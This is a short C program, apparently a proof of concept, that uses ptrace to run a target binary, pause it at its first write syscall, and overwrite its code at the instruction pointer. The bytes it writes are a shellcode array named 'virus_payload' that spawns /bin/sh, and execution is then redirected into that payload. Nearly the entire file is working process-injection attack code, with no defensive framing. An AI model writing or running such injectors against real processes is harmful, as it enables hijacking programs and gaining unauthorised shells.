#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sched.h>
#include <getopt.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>

char virus_payload[] =
    "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";

int inject_code(pid_t pid, long address, int size, void *payload);

int main(int argc, char *argv[])
{
	struct user_regs_struct registers;
	pid_t pid = fork();
	
	int status = 0;
	/* Child process */
	if(pid == 0)
	{

		int ret = ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        kill(getpid(), SIGSTOP);
		
		execl(argv[1], argv[1], 0);
	}
	
	else
	{
        wait(&status);
		ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
		while(1)
		{
            ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
            wait(&status);
            ptrace(PTRACE_GETREGS, pid, NULL, &registers);
            if(registers.orig_rax == SYS_write)
            {
                long addr = registers.rip;//rsp-1024;
                inject_code(pid, addr, strlen(virus_payload), (void *)virus_payload);

                registers.rip = addr;//+2;
                printf("[+] RIP now points to 0x%0.16x\n", registers.rip);
                ptrace(PTRACE_SETREGS, pid, 0, &registers);
                ptrace(PTRACE_DETACH, pid, 0, 0);
                break;
            }

                     

           ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        
		}
	}
}

int inject_code(pid_t pid, long address, int size, void *payload)
{
    int i = 0;
    unsigned long curr_payload;
    long tmp_addr;

    while(i < size)
    {
        /* copy 8 bytes of the payload */
        memcpy(&curr_payload, payload, sizeof(long));

        /* Move those 8 bytes into the address we have calculated */
        ptrace(PTRACE_POKETEXT, pid, address, curr_payload);
        i += sizeof(long);
        payload += sizeof(long);
        address += sizeof(long);

    }
    
    return 0;
}



